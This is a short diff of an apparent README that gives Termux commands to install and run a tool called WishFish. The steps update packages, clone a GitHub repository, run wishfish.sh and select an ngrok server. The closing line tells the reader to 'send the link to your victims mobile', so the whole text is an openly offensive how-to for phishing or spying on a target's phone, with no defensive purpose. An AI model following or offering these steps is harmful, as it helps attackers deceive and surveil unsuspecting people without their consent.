@@ -1,3 +1,12 @@
-The file is about to install WishFish in ANDROID TERMUX.
-code:
-git clone https://github.com/techtricks0/WishFish
+The file is about install WishFish in anndroid termux
+CODE:
+$ apt update && apt upgrade
+$ apt install php wget git
++now clone into wishfish
+$ git clone https://github.com/techtricks0/WishFish
++now turn on your mobile hotspot
++after cloning wishfish type the command
+$ cd WishFish
+$ bash wishfish.sh
++now select the 02[ngrok] server
++then the link will be generated and send the link to your victims mobile.
